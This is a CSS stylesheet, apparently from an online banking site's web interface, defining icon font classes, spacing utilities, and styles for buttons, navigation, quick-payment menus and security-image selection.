  .icon-exchange:before {
    content: "\f0ec";
  }
  .icon-cloud-download:before {
    content: "\f0ed";
  }
  .icon-cloud-upload:before {
    content: "\f0ee";
  }
  .icon-user-md:before {
    content: "\f0f0";
  }
  .icon-stethoscope:before {
    content: "\f0f1";
  }
  .icon-suitcase:before {
    content: "\f0f2";
  }
  .icon-bell-alt:before {
    content: "\f0f3";
  }
  .icon-coffee:before {
    content: "\f0f4";
  }
  .icon-food:before {
    content: "\f0f5";
  }
  .icon-file-text-alt:before {
    content: "\f0f6";
  }
  .icon-building:before {
    content: "\f0f7";
  }
  .icon-hospital:before {
    content: "\f0f8";
  }
  .icon-ambulance:before {
    content: "\f0f9";
  }
  .icon-medkit:before {
    content: "\f0fa";
  }
  .icon-fighter-jet:before {
    content: "\f0fb";
  }
  .icon-beer:before {
    content: "\f0fc";
  }
  .icon-h-sign:before {
    content: "\f0fd";
  }
  .icon-plus-sign-alt:before {
    content: "\f0fe";
  }
  .icon-double-angle-left:before {
    content: "\f100";
  }
  .icon-double-angle-right:before {
    content: "\f101";
  }
  .icon-double-angle-up:before {
    content: "\f102";
  }
  .icon-double-angle-down:before {
    content: "\f103";
  }
  .icon-angle-left:before {
    content: "\f104";
  }
  .icon-angle-right:before {
    content: "\f105";
  }
  .icon-angle-up:before {
    content: "\f106";
  }
  .icon-angle-down:before {
    content: "\f107";
  }
  .icon-desktop:before {
    content: "\f108";
  }
  .icon-laptop:before {
    content: "\f109";
  }
  .icon-tablet:before {
    content: "\f10a";
  }
  .icon-mobile-phone:before {
    content: "\f10b";
  }
  .icon-circle-blank:before {
    content: "\f10c";
  }
  .icon-quote-left:before {
    content: "\f10d";
  }
  .icon-quote-right:before {
    content: "\f10e";
  }
  .icon-spinner:before {
    content: "\f110";
  }
  .icon-circle:before {
    content: "\f111";
  }
  .icon-mail-reply:before,
  .icon-reply:before {
    content: "\f112";
  }
  .icon-github-alt:before {
    content: "\f113";
  }
  .icon-folder-close-alt:before {
    content: "\f114";
  }
  .icon-folder-open-alt:before {
    content: "\f115";
  }
  .icon-expand-alt:before {
    content: "\f116";
  }
  .icon-collapse-alt:before {
    content: "\f117";
  }
  .icon-smile:before {
    content: "\f118";
  }
  .icon-frown:before {
    content: "\f119";
  }
  .icon-meh:before {
    content: "\f11a";
  }
  .icon-gamepad:before {
    content: "\f11b";
  }
  .icon-keyboard:before {
    content: "\f11c";
  }
  .icon-flag-alt:before {
    content: "\f11d";
  }
  .icon-flag-checkered:before {
    content: "\f11e";
  }
  .icon-terminal:before {
    content: "\f120";
  }
  .icon-code:before {
    content: "\f121";
  }
  .icon-reply-all:before {
    content: "\f122";
  }
  .icon-mail-reply-all:before {
    content: "\f122";
  }
  .icon-star-half-full:before,
  .icon-star-half-empty:before {
    content: "\f123";
  }
  .icon-location-arrow:before {
    content: "\f124";
  }
  .icon-crop:before {
    content: "\f125";
  }
  .icon-code-fork:before {
    content: "\f126";
  }
  .icon-unlink:before {
    content: "\f127";
  }
  .icon-question:before {
    content: "\f128";
  }
  .icon-info:before {
    content: "\f129";
  }
  .icon-exclamation:before {
    content: "\f12a";
  }
  .icon-superscript:before {
    content: "\f12b";
  }
  .icon-subscript:before {
    content: "\f12c";
  }
  .icon-eraser:before {
    content: "\f12d";
  }
  .icon-puzzle-piece:before {
    content: "\f12e";
  }
  .icon-microphone:before {
    content: "\f130";
  }
  .icon-microphone-off:before {
    content: "\f131";
  }
  .icon-shield:before {
    content: "\f132";
  }
  .icon-calendar-empty:before {
    content: "\f133";
  }
  .icon-fire-extinguisher:before {
    content: "\f134";
  }
  .icon-rocket:before {
    content: "\f135";
  }
  .icon-maxcdn:before {
    content: "\f136";
  }
  .icon-chevron-sign-left:before {
    content: "\f137";
  }
  .icon-chevron-sign-right:before {
    content: "\f138";
  }
  .icon-chevron-sign-up:before {
    content: "\f139";
  }
  .icon-chevron-sign-down:before {
    content: "\f13a";
  }
  .icon-html5:before {
    content: "\f13b";
  }
  .icon-css3:before {
    content: "\f13c";
  }
  .icon-anchor:before {
    content: "\f13d";
  }
  .icon-unlock-alt:before {
    content: "\f13e";
  }
  .icon-bullseye:before {
    content: "\f140";
  }
  .icon-ellipsis-horizontal:before {
    content: "\f141";
  }
  .icon-ellipsis-vertical:before {
    content: "\f142";
  }
  .icon-rss-sign:before {
    content: "\f143";
  }
  .icon-play-sign:before {
    content: "\f144";
  }
  .icon-ticket:before {
    content: "\f145";
  }
  .icon-minus-sign-alt:before {
    content: "\f146";
  }
  .icon-check-minus:before {
    content: "\f147";
  }
  .icon-level-up:before {
    content: "\f148";
  }
  .icon-level-down:before {
    content: "\f149";
  }
  .icon-check-sign:before {
    content: "\f14a";
  }
  .icon-edit-sign:before {
    content: "\f14b";
  }
  .icon-external-link-sign:before {
    content: "\f14c";
  }
  .icon-share-sign:before {
    content: "\f14d";
  }
  .icon-compass:before {
    content: "\f14e";
  }
  .icon-collapse:before {
    content: "\f150";
  }
  .icon-collapse-top:before {
    content: "\f151";
  }
  .icon-expand:before {
    content: "\f152";
  }
  .icon-euro:before,
  .icon-eur:before {
    content: "\f153";
  }
  .icon-gbp:before {
    content: "\f154";
  }
  .icon-dollar:before,
  .icon-usd:before {
    content: "\f155";
  }
  .icon-rupee:before,
  .icon-inr:before {
    content: "\f156";
  }
  .icon-yen:before,
  .icon-jpy:before {
    content: "\f157";
  }
  .icon-renminbi:before,
  .icon-cny:before {
    content: "\f158";
  }
  .icon-won:before,
  .icon-krw:before {
    content: "\f159";
  }
  .icon-bitcoin:before,
  .icon-btc:before {
    content: "\f15a";
  }
  .icon-file:before {
    content: "\f15b";
  }
  .icon-file-text:before {
    content: "\f15c";
  }
  .icon-sort-by-alphabet:before {
    content: "\f15d";
  }
  .icon-sort-by-alphabet-alt:before {
    content: "\f15e";
  }
  .icon-sort-by-attributes:before {
    content: "\f160";
  }
  .icon-sort-by-attributes-alt:before {
    content: "\f161";
  }
  .icon-sort-by-order:before {
    content: "\f162";
  }
  .icon-sort-by-order-alt:before {
    content: "\f163";
  }
  .icon-thumbs-up:before {
    content: "\f164";
  }
  .icon-thumbs-down:before {
    content: "\f165";
  }
  .icon-youtube-sign:before {
    content: "\f166";
  }
  .icon-youtube:before {
    content: "\f167";
  }
  .icon-xing:before {
    content: "\f168";
  }
  .icon-xing-sign:before {
    content: "\f169";
  }
  .icon-youtube-play:before {
    content: "\f16a";
  }
  .icon-dropbox:before {
    content: "\f16b";
  }
  .icon-stackexchange:before {
    content: "\f16c";
  }
  .icon-instagram:before {
    content: "\f16d";
  }
  .icon-flickr:before {
    content: "\f16e";
  }
  .icon-adn:before {
    content: "\f170";
  }
  .icon-bitbucket:before {
    content: "\f171";
  }
  .icon-bitbucket-sign:before {
    content: "\f172";
  }
  .icon-tumblr:before {
    content: "\f173";
  }
  .icon-tumblr-sign:before {
    content: "\f174";
  }
  .icon-long-arrow-down:before {
    content: "\f175";
  }
  .icon-long-arrow-up:before {
    content: "\f176";
  }
  .icon-long-arrow-left:before {
    content: "\f177";
  }
  .icon-long-arrow-right:before {
    content: "\f178";
  }
  .icon-apple:before {
    content: "\f179";
  }
  .icon-windows:before {
    content: "\f17a";
  }
  .icon-android:before {
    content: "\f17b";
  }
  .icon-linux:before {
    content: "\f17c";
  }
  .icon-dribbble:before {
    content: "\f17d";
  }
  .icon-skype:before {
    content: "\f17e";
  }
  .icon-foursquare:before {
    content: "\f180";
  }
  .icon-trello:before {
    content: "\f181";
  }
  .icon-female:before {
    content: "\f182";
  }
  .icon-male:before {
    content: "\f183";
  }
  .icon-gittip:before {
    content: "\f184";
  }
  .icon-sun:before {
    content: "\f185";
  }
  .icon-moon:before {
    content: "\f186";
  }
  .icon-archive:before {
    content: "\f187";
  }
  .icon-bug:before {
    content: "\f188";
  }
  .icon-vk:before {
    content: "\f189";
  }
  .icon-weibo:before {
    content: "\f18a";
  }
  .icon-renren:before {
    content: "\f18b";
  }
  
  
  html, body { padding: 0; margin: 0; font-family: Arial,sans-serif; height: 100%; min-height: 100%!important; color: #606060; }
html { -webkit-tap-highlight-color: rgba(0,0,0,0); background: #E8E6DE url(../images/body_top_bg.png) left top repeat-x!important; height: auto !important; background-color: #E8E6DE; }
body { height: auto !important; background: #E8E6DE  url(../images/body_center_bg.png) center top repeat-y!important; margin-top: -1px!important; border-bottom: 140px solid #E8E6DE; font-size: 1.2em; overflow-y: scroll; }
.bold-txt { font-weight: bold !important }
.w-no-wrap { white-space: nowrap!important }
a { border-bottom: none }
/*page-loader*/
.date-right{right: 6px!important;}
.Height200px { height: 200px; overflow-y: scroll; }
.positionnone { position: inherit!important }
.inlineBlock { display: inline-block; width: 60%; }
.alignright { text-align: right }
.aligntop { vertical-align: text-top!important }
.veraligntop { vertical-align: top!important  }
.veralignmiddle { vertical-align: middle!important }
.textlignmiddle { vertical-align: text-bottom }
.aligncenter { text-align: center; vertical-align: text-top; margin-top: 15%; }
.aligncenter-img-carosal { text-align: center; vertical-align: text-top; margin-left: auto; margin-right: auto; }
.centeralign { text-align: center; vertical-align: text-top; }
.bottomalign { text-align: center; vertical-align: bottom!important; }
.mrgn-right-50 { margin-right: 50px !important }
.mrgn-top-10 { margin-top: 10px !important }
.mrgn-top-18 { margin-top: 18px !important; }
.mrgn-top-32 { margin-top: 32px !important }
.mrgn-top-24 { margin-top: 24px !important }
.mrgn-top-25 { margin-top: 25px !important }
.mrgn-top-20 { margin-top: 20px !important }
.mrgn-top-15 { margin-top: 15px !important }
.mrgn-top-8 { margin-top: 8px !important }
.mrgn-top-7 { margin-top: 7px !important }
.mrgn-top-6 { margin-top: 6px !important }
.mrgn-top-5 { margin-top: 5px !important }
.mrgn-top-3 { margin-top: 3px !important }
.mrgn-btm-0 { margin-bottom: 0px !important }
.mrgn-btm-5 { margin-bottom: 5px !important }
.mrgn-btm-10 { margin-bottom: 10px !important }
.mrgn-btm-15 { margin-bottom: 15px !important }
.mrgn-btm-20 { margin-bottom: 20px !important }
.pad-lft-5 { padding-left: 5px !important }
.pad-lft-15 { padding-left: 15px !important }
.pad-lft-20 { padding-left: 20px !important }
.pad-lft-25 { padding-left: 25px !important }
.pad-lft-30 { padding-left: 30px !important }
.pad-lft-40 { padding-left: 40px !important }
.pad-lft-50 { padding-left: 50px !important }
.mar-lft-10 { margin-left: 10px !important }
.mar-lft-5 { margin-left: 5px !important }
.pad-lft-0 { padding-left: 0px !important }
.pad-right-0 { padding-right: 0px !important }
.margin15 { margin: 15px !important }
.margin0 { margin: 0!important }
.butnmargin { margin: 10px 15px -5px 0!important }
.mrgn-btm-minus5 { margin-bottom: -5px!important }
.mrgn-btm-minus10 { margin-bottom: -10px!important }
.mrgn-top-minus1 { margin-top: -1px !important }
.mrgn-top-minus5 { margin-top: -5px !important }
.mrgn-top-minus10 { margin-top: -10px !important }
.mrgn-top-minus20 { margin-top: -20px !important }
.mrgn-top-minus30 { margin-top: -30px !important }
.mrgn-top-minus50 { margin-top: -50px !important }
.mrgn-top-0 { margin-top: 0px !important }
.mrgn-top-90 { margin-top: 90px !important }
.pad-btm-15 { padding-bottom: 15px !important }
.pad-btm-20 { padding-bottom: 20px !important }
.pad-btm-24 { padding-bottom: 24px !important }
.pad-btm-25 { padding-bottom: 25px !important }
.pad-btm-30 { padding-bottom: 30px !important }
.pad-btm-10 { padding-bottom: 10px !important }
.pad-btm-8 {  padding-bottom: 8px !important}
.pad-btm-5 { padding-bottom: 5px !important }
.pad-btm-3 { padding-bottom: 3px !important }
.pad-btm-4 { padding-bottom: 4px !important }
.pad-btm-0 { padding-bottom: 0 !important }
.padding15 { padding: 15px!important }
.padding10 { padding: 10px!important }
.padding30 { padding: 25px!important }
.mrgn-right-minus10 { margin-right: -10px !important }
.mrgn-right-0 { margin-right: 0px !important }
.mrgn-right-min10 { margin-right: -10px !important }
.pad-lft-10 { padding-left: 10px !important }
.pad-lft-12 { padding-left: 12px !important }
.pad-right-10 { padding-right: 10px !important }
.pad-top-1 {padding-top: 1px !important }
.pad-top-3 {padding-top: 3px !important }
.pad-top-5 {padding-top: 5px !important }
.pad-top-10 { padding-top: 10px !important }
.pad-top-15 { padding-top: 15px !important }
.pad-top-20 { padding-top: 20px !important }
.pad-top-25 { padding-top: 25px !important }
.pad-top-30 { padding-top: 30px !important }
.pad-top-35 { padding-top: 35px !important }
.pad-top-0 { padding-top: 0px !important }
.mrgn-right-3 { margin-right: 3px !important }
.mrgn-right-5 { margin-right: 5px !important }
.mrgn-right-10 { margin-right: 10px !important }
.pad-right-25 { padding-right: 25px !important }
.pad-right-30 { padding-right: 30px !important }
.pad-right-15 { padding-right: 15px !important }
.mrgn-lft-5 { margin-left: 5px !important }
.mrgn-lft-10 { margin-left: 10px !important }
.mrgn-lft-15 { margin-left: 15px !important }
.mrgn-lft-20 { margin-left: 20px !important }
.mrgn-lft-25 { margin-left: 25px !important }
.mrgn-lft-30 { margin-left: 30px !important }
.mrgn-lft-35 { margin-left: 35px !important }
.mrgn-lft-100 { margin-left: 100px !important }
.mrgn-lft-90 { margin-left: 90px !important }
.mrgn-lft-0 { margin-left: 0px!important }
.mrgn-lft-minus20 { margin-left: -20!important; left: -10px; position: relative; }
.mrgn-lft-minus10 { margin-left: -10!important; left: -5px; position: relative; }
.mrgn-lft-minus-10 { margin-left: -10px!important; }
.padding5 { padding: 5px }
.padding15 { padding: 15px }
.padding0 { padding: 0px!important; }
.margin5 { margin: 5px }
.width30px { width: 30px }
.width75px { width: 75px!important }
.mrgn-left-5% { padding-left: 15%!important }
.mrgn-right-15percent { margin-right: 15%!important }
.mrgn-right-20percent { margin-right: 20%!important }
.mrgn-btm-1percent { margin-bottom: 1.5%!important }
.mrgn-top-2percent { margin-top: 2.5%!important }
.width-100-percent{width: 100% !important;}
.width-80-percent{width: 80% !important;}
.width-72-percent{width: 72% !important;}
.width-60-percent{width: 60% !important;}
.width-20-percent{width: 20% !important;}
.width-13-percent{width: 13% !important;}
.width-38-percent{width: 38% !important;}
.RUIFW-page-loader { width: 100%; height: 100%; background: rgba(0, 0, 0, 0.4)!important; position: absolute; top: 0; z-index: 999999999; }
.RUIFW-page-loader .RUIFW-loader { display: block; position: relative; top: 30%; margin: 0 auto; text-align: center; color: #FFFFFF; }
/*font-size-settings*/
html { /* font-size: 62.5%; */ }
body { /* font-size: 1.4rem; */ } /* =14px _NO__DOTCOMMA__AFTER__*/
h1 { font-size: 2.4rem; font-size: 24px; } /* =24px */
h2, h2 a { font-size: 2rem; font-size: 20px; color: #333333 !important; }
h3 { font-size: 1.8rem; font-size: 18px; color: #606060; min-height: 26px; }
h4 { font-size: 1.6rem; font-size: 16px; color: #606060; }
h5 { font-size: 1.4rem; color: #606060; }
h6 { font-size: 1.4rem; color: #606060 !important; }
h6 a { font-size: 18px; color: #333333 !important; }
.bottom-box h2 { font-size: 1.8em; color: #333333 !important; }
.bottom-box h2 a { font-size: 1.8em; color: #333333 !important; }
textarea { resize: none }
input[type=date] { -webkit-appearance: none }
/*h3 div{float: right;margin-right:20px; vertical-align:top;   }
h3 div:last-child{float: none; }
h3 div.quick-menu{position: relative; /*margin:0 0 0 15px!important; float:right;  vertical-align:top; clear:both; }_NO__DOTCOMMA__AFTER__*/
h3 div { float: left; font-size: 0.9em; max-width: 75%; }
h3 div:last-child { float: none }
h3 div.quick-menu { position: relative; margin: 0 0 0 5px; }
ol { padding: 0 0 0 15px }
ul[class*="RUIFW-list"] { font-size: 1.3rem; font-size: 13px; list-style: none outside none; padding-left: 20px; }
ul[class*="RUIFW-list"] li { padding: 2px 4px }
ul[class*="RUIFW-list"] li:before { color: #333333; content: "\f105"; font-family: fontAwesome; left: -18px; position: absolute; top: 0; }
ul[class*="RUIFW-list"] li + li { margin-top: 10px }
/*page layout setting*/
.RUIFW-page-wrap, .RUIFW-page-footer { max-width: 980px }
.RUIFW-page-footer { margin-top: 20px; background: #E8E6DE; text-align: inherit; min-width: 768px; }
.RUIFW-page-wrap { background: #fff; margin-top: 40px; margin-bottom: 0; -webkit-box-shadow: 0px 1px 3px 0px rgba(134, 134, 134, 1); -moz-box-shadow: 0px 1px 3px 0px rgba(134, 134, 134, 1); box-shadow: 0px 1px 3px 0px rgba(134, 134, 134, 1); }
section { border-top: 5px solid #f1f1f1; border-right: 5px solid #f1f1f1; border-left: 5px solid #f1f1f1; padding-bottom: 15px; }
/*color code*/
a { color: #2A5DB0; text-decoration: none; display: inline-block; }
a:hover { color: #16B2EC; /*text-decoration: underline; border-bottom: 1px dotted; margin-bottom: 0;*/ }
a img { border: none }
.clear { clear: both }
.desk-icons { margin-right: 30px; margin-top: 20px; }
.desk-icons a { color: #000; text-decoration: none; padding: 0 0 0 5px; font-size: 16px; }
/*page header*/
.RUIFW-container-header { margin: 0 }
.RUIFW-page-header { height: 81px }
*[class*=RUIFW-brand] { background-image: url("../images/scotiabank_logo.svg"); width: 357px; height: 41px; margin: 5px 0 0 20px; }
.RUIFW-page-header *[class*=RUIFW-brand] { top: 16px }
.RUIFW-container-quick-links { position: absolute; right: 20px; top: -27px; width: 430px !important; background: #f5f5f5; font-size: 12px; border: solid 4px #d8d8d8  !important; color: #606060; }
.RUIFW-container-quick-links ul { width: 100%; margin: 0; display: table; }
.RUIFW-nav-quick-links li {width: 39%; height: 46px; }
.RUIFW-nav-quick-links li.lftbox { width: 60%; border-right: 1px solid #d4d4d4; -webkit-box-shadow: 1px 0px 0px 0px rgba(255, 255, 255, 0.75); -moz-box-shadow: 1px 0px 0px 0px rgba(255, 255, 255, 0.75); box-shadow: 1px 0px 0px 0px rgba(255, 255, 255, 0.75); padding:0px; }
.RUIFW-nav-quick-links li.lftbox.bold-txt{padding:7px 7px 0px 7px; }
.RUIFW-nav-quick-links li span { display: block; vertical-align: middle; padding: 1px; }
.RUIFW-nav-quick-links li span.h-separator { border-top: 1px solid #d4d4d4; -webkit-box-shadow: inset 0 2px 1px -1px rgba(255, 255, 255, 0.75); -moz-box-shadow: inset 0 2px 1px -1px rgba(255, 255, 255, 0.75); box-shadow: inset 0 2px 1px -1px rgba(255, 255, 255, 0.75); margin:0 7px 0px 7px; padding:7px 0px 0px 0px;}
.RUIFW-nav-quick-links li .h-separator .pull-right{ width:80%;}
.RUIFW-nav-quick-links li span a { border-left: 0; border-right: 0; color: #606060; font-size: 12px; padding: 0; }
.RUIFW-nav-quick-links li a { border-left: 1px dotted #000000; border-right: medium none; color: #000000; font-size: 1.1rem; padding: 0 10px; }
.RUIFW-nav-quick-links li a:hover { background: transparent; text-decoration: underline; cursor: pointer; }
.RUIFW-nav-main > li > a { border-right: none; font-size: 15px; font-weight: normal; padding: 12px!important; border-top: 1px solid #D81E05; line-height: 20px; text-shadow: none; filter: none!important; }
.RUIFW-bg-bar .RUIFW-bg-main-nav { filter: none!important }
.RUIFW-container-well { margin-bottom: 0px }
a:focus { outline: none!important; text-decoration: none; }
.headTopLinks { float: right !important; text-align: right; }
.headTopLinks a { margin: 10px 0 0 10px }
.headTopLinks form { display:inline-block;}
.RUIFW-page-header *[class*=RUIFW-brand] { position: relative; top: 20px; }
.RUIFW-nav-main > li.has-submenu a:after { padding: 3px 0 0 9px!important }
/*------ by Mukkaram --------------------*/
.grey-box { background: #F1F1F1; padding: 15px; margin: 0 0 0 5px; border-radius: 4px; }
.grey-box2 { background: #F1F1F1; padding: 0; margin: 0; }
.red-box { background: #ffffff; padding: 15px; margin: 0; border-left: 1px solid #D7D7D7; border-bottom: 1px solid #D7D7D7; border-right: 1px solid #D7D7D7; }
.red-box .accsec .form-control { font-size: 1em; margin: 10px 0 10px 0; }
.pad-2px { padding: 2px }
.box-hr-separator { border-top: 1px solid #d8d8d8; border-bottom: 1px solid #d8d8d8; margin: 10px 0; padding: 10px; }
.box-hr-separator2 { border-bottom: 1px solid #d7d7d7; margin: 10px 0; padding: 10px; }
.box-hr-separator3 { background: #d7d7d7; margin: 10px 0 10px 0; height: 1px; width: 100%; }
.box-hr-separator4 { border-bottom: 1px solid #d7d7d7; padding: 10px 0 15px 0; margin: 0 15px 0 15px; }
.box-hr-separator5 { border-bottom: 1px solid #d7d7d7; padding: 15px 0 15px 0; margin: 0 15px 0 15px; }
.box-hr-separator.pull-up { margin-top: -10px; border-top: none; }
.vertical-separator { border-right: 1px solid #c5c5c5 }
.mandatory { color: #D81E05 }
.marg-left15px { margin-left: 15px!important }
.security-img-container, .security-img-container-selected { text-align: center }
.security-img-container span.img-holder, .payee-img span.img-holder { width: 65px; height: 65px; cursor: pointer; }
.security-img-container-selected span.img-holder { width: 65px; height: 65px; }
.security-img-container span.img-holder img, .security-img-container-selected span.img-holder img, .payee-img span.img-holder img { width: 75px; height: 75px; padding: 2px; margin: 0 15px 15px 0; border: 2px solid #; }
.security-img-container span.img-holder img.selected, .security-img-container-selected span.img-holder img.selected, .payee-img span.img-holder img.selected { border: 3px solid #D81E05 }
.security-img-container span.img-holder img:hover, .payee-img span.img-holder img:hover { cursor: pointer; filter: progid:DXImageTransform.Microsoft.Matrix(/* IE6�IE9 */ M11=0.9999619230641713, M12=-0.008726535498373935, M21=0.008726535498373935, M22=0.9999619230641713,SizingMethod='auto expand'); transform: scale(1.1); -ms-transform: scale(1.1); /* IE 9 */ -moz-transform: scale(1.1); /* Firefox */ -webkit-transform: scale(1.1); /* Safari and Chrome */ -o-transform: scale(1.1); /* Opera */ }
.marketing-img { text-align: center; padding: 10px; border: 1px solid #E8E6DE; margin-left: 5px; border-radius: 4px; }
.btn.desk-btn { background-color: #D81E05; border: 2px solid #D81E05; color: #FFFFFF; padding: 3px 10px; }
*[class*="RUIFW-btn"], .btn { background-image: none!important; filter: none !important; box-shadow: 0 0 0; text-shadow: 0 0 0; padding: 3px 15px; color: #fff; border-style: solid; border-width: 1px; }
*[class*="RUIFW-btn"], .btn:hover { color: #fff }
*[class*="RUIFW-btn"], .btn:focus { color: #fff }
*[class*="RUIFW-btn"]:hover { color: #fff }
.RUIFW-btn-primary, .btn.action-btn, .btn-primary { background-color: #D81E05; border-color: #D81E05; filter: none !important; vertical-align:top!important; }
.RUIFW-btn-primary:hover, .btn.action-btn:hover, .btn-primary:hover { background-color: #ed1c00; border-color: #D81E05; }
.icon-btn { background: #ffffff!important; border: none!important; color: #ffffff!important; vertical-align: middle; text-align: center; }
.RUIFW-btn-primary:focus { border-color: #D81E05 }
.icon-btn:hover { background: transparent; border: none; }
.icon-btn:focus { background: transparent; border: none; }
.RUIFW-btn span.icon-bookmark, .btn.actionicon-btn span.icon-bookmark { font-size: 18px }
.RUIFW-btn span.icon-cog, .btn.actionicon-btn span.icon-cog { font-size: 18px; color: #d71e05!important; }
span.icon-info-sign { margin-left: 5px; background: url(../images/info_icon_12x12.png) left top no-repeat; width: 12px; height: 12px; display: inline-block; vertical-align: text-top!important; }
span.icon-info-sign:before { content: none }
a .icon-info-sign:hover { color: #2A5DB0!important }
a .icon-info-sign:before { color: #2A5DB0!important; margin-bottom: -10px!important; position: absolute; }
.padd-lt-3px { padding-left: 3px }
.padd-rt-3px { padding-right: 3px }
.RUIFW-btn, .btn.default-btn, .RUIFW-btn:hover, .btn-default, .btn-default:hover { background-color: #606060!important; border: 1px solid #606060!important; }
.RUIFW-btn:hover, .btn.default-btn:hover { background-color: #6d6d6d }
.RUIFW-btn:focus, .btn.default-btn:focus { background-color: #6d6d6d }
.signout-btn { position: absolute; right: 10px; top: 7px; }
.icon-lock-signout { color: #D81E05; font-size: 16px; margin: 1px 0 0 0; padding: 0 5px 0 13px; float:left; width:10%;}
.icon-red { color: #D81E05; font-size: 14px; margin: 0 5px 0 0; }
.main-icons { float:right!important; font-size: 26px; }
.main-icons ul li a { float: right; font-size: 25px; }
.main-icons a { padding: 0 5px 0 0; color: #fff; text-decoration: none; }
a [class*="icon-"]:hover { text-decoration: none !important }
/*
.equal, .equal > div[class*='col-'] {
    display: -webkit-flex;
    display: flex;
    flex:1 1 auto;
}*/
.divOff { display: none }
.divOn { display: block }
.hr-separator { width: 100%; border-bottom: 1px solid #D7D7D7; height: 1px; margin-bottom: 15px; }
.hr-separator2 { width: 100%; border-bottom: 1px dotted #606060; height: 1px; }
.hr-separator3 { width: 100%; border-bottom: 1px solid #D7D7D7; height: 1px; }
.exp-collapse a { color: #606060; padding: 0 0 0 15px; }
.exp-collapse a:hover { text-decoration: none }
.exp-collapse a:before { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; content: "\f0da"; color: #d81e05; /*do not change this one ---- its reflecting for multiple*/ position: absolute; font-size: 18px; }
.exp-collapse h6 { margin: 0!important; padding: 10px 5px 10px 0; background-color: #d81e05; word-wrap: break-word; }
.exp-collapse h6 a { color: #ffffff!important; font-weight: normal!important; font-size: 1.3rem; font-size: 13px; }
.exp-collapse h5 { margin: 0 0 0 0!important; padding: 0; }
.exp-collapse h5 a { color: #2A5DB0!important; font-weight: normal!important; font-size: 1.2rem!important; }
.exp-collapse h2 a:before { margin: -2px 0 0 -17px; font-size: 25px!important; }
.exp-collapse h4 { margin-bottom: 8px; margin-top: 2px; }
.exp-collapse h4 a { margin: 10px 0 0 25px }
.exp-collapse h4 a:before { margin: 0 0 0 -25px }
.exp-collapse h6 a:before { margin: 2px 0 0 -14px }
.exp-collapse a.Open:before { content: "\f0d7" }
.navleft div li.exp-collapse a:before { color: #606060!important }
.navleft div div ul li { padding-left: 20px; background-color: #ffffff!important; }
.navleft div div ul li.active { background-color: #d4d4d4!important }
.quick-menu-box { font-size: 1.6rem; font-size: 16px; border-collapse: collapse; width: 100%; margin: 0 0 30px; padding: 0 1%; /*height: 100%;*/ }
.quick-menu-box a { background: #f1f1f1; /*: ; background-image: -moz-linear-gradient(top, #f5f5f5, #e4e4e4); background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#f5f5f5), to(#e4e4e4)); background-image: -webkit-linear-gradient(top, #f5f5f5, #e4e4e4); background-image: -o-linear-gradient(top, #f5f5f5, #e4e4e4); background-image: linear-gradient(to bottom, #f5f5f5, #e4e4e4); filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#f5f5f5', endColorstr='#e4e4e4', GradientType=0); -webkit-box-shadow: inset 0px 0px 2px 0px rgba(224, 224, 224, 0.75); -moz-box-shadow: inset 0px 0px 2px 0px rgba(224, 224, 224, 0.75); box-shadow: inset 0px 0px 2px 0px rgba(224, 224, 224, 0.75); */ padding: 15px 15px 15px 15px; float: left; width: 23%; margin: 0 1%; font-weight: normal; display: block; border-bottom: 1px solid #D7D7D7; border-left: 1px solid #D7D7D7; border-right: 1px solid #D7D7D7; }
.quick-menu-box a span { font-size: 0.8em; color: #606060; display: block; margin-top: 3px; font-weight: normal; }
.quick-menu-box a:hover { text-decoration: none; background: #eaeaea; }
.quick-menu-box a.pay-bill { border-top: 7px solid #B5121B; nowhitespace: afterproperty; color: #B5121B; /* box-shadow: inset 0 7px 0 0 #B5121B;*/; }
.quick-menu-box a.send-money { border-top: 7px solid #E20177; color: #E20177; }
.quick-menu-box a.transfer { border-top: 7px solid #0084A9; color: #0084A9; }
.quick-menu-box a.topup-mobile { border-top: 7px solid #8D8B00; color: #8D8B00; }
.flt-lft { float: left }
.flt-rgt { float: right }
.flt-none { float: none!important }
.RUIFW-content-side { padding-left: 5px; padding-right: 19px; }
.overview-sect1 { display: block; border-right: 2px solid #ffffff; padding-bottom: 10px; }
.overview-sect2 { background: #f3f3f3; display: block; padding: 15px 15px 10px 25px; height: 115px; }
.overview-sect2 div.rgr-txt, .overview-sect2 div.big-txt, .overview-sect2 div.sml-txt { padding: 2px 0 }
.sml-txt { font-size: 11px }
.rgr-txt { font-size: 1.2em; color: #606060; }
.big-txt { font-size: 18px }
.assets { height: 13px; background: #00bb04; }
.liab { height: 13px; background: #f5f5f5; }
.assets-amt, .liab-amt { font-size: 1.2em; color: #606060; padding-top: 32px; padding-left: 0px; text-align: right; white-space: nowrap; }
.progress { height: 14px; border-radius: 0px; background-image: none; background: #d5d5d5!important; }
.progress-bar-success { background-image: none; background: #00bb04; }
.progress-bar-danger { background-image: none; background: #d81e05; }
.sub-header-bg { /*background: #F9F9F7;*/ padding: 11px 11px 0 11px; vertical-align: top; white-space: nowrap; z-index:0; }
.sub-header-bg    .form-control { display: inline }
.inline-nav { float: right; font-size: 17px; border: none; }
.inline-nav li.active { border: none!important }
.inline-nav li a { color: #d81e05; background: transparent!important; border: none!important; }
.inline-nav .dropdown-menu li a { color: #333333 }
.open > .dropdown-toggle.btn-default { color: #606060 }
.open > .dropdown-toggle.btn-default .user-icon-white{background: url(../images/add-payee_gray.png) left top no-repeat;}
.nav-tabs > li.active > a, .nav-tabs > li.active > a:hover, .nav-tabs > li.active > a:focus { color: #606060 }
.txt-center { text-align: center }
.txt-right { text-align: right!important; }
.RUIFW-table-border tbody tr th, .RUIFW-table-border td { border-left: medium none !important; border-right: medium none !important; }
.regular-table { border-left: medium none !important; border-right: medium none !important; }
.quick-menu { position: absolute }
.quick-menu .dropdown-toggle.btn-default { position: absolute!important; border: 1px solid #da1c05!important; background: #da1c05!important; }
.quick-menu_overviewPage { margin: 15px 0 0 0; font-weight: normal!important; text-align: right!important; float: right!important; left: auto!important; position: relative!important; width: 51px; }
.quick-menu_overviewPage button, .quick-menu_overviewPage input { font-weight: normal!important; float: right!important; left: auto!important; }
.quick-menu_TransfersoverviewPage { margin:0 10px 0 0; font-weight: normal!important; text-align: right!important; min-width: 51px; display:inline-block; position:relative; vertical-align:text-top;}

.quick-menu_TransfersoverviewPage button, .quick-menu_TransfersoverviewPage input { font-weight: normal!important;  }
.quick-menu .dropdown-toggle.btn-default span { border-top-color: #fff }
